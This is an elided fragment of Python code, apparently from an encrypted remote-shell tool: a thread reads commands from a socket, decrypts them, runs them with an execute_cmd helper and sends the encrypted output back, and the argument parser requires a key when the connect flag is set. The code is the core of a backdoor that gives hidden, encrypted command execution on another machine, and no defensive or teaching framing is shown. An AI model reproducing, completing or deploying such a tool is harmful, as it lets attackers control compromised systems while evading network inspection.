...
def shell_thread(s):
    ...
    try:
        while True:
            ...
            if data:
                buffer = cipher.decrypt(decode_and_strip(data).encode("latin-1"))
                buffer = buffer.decode("latin-1").strip()

            if not buffer or buffer == "exit":
                s.close()
                exit()

            print("> Executing cmd: '{}'".format(buffer))
            encrypted_send(s, execute_cmd(buffer.encode("latin-1")))
    except:
        s.close()
        exit()
...
def recv_thread(s):
    try:
        while True:
            ...
            if data:
                data = cipher.decrypt(data.encode("latin-1")).decode("latin-1")
...
if args.connect and not args.key:
    parser.error("-c Connect required -k key!!!")
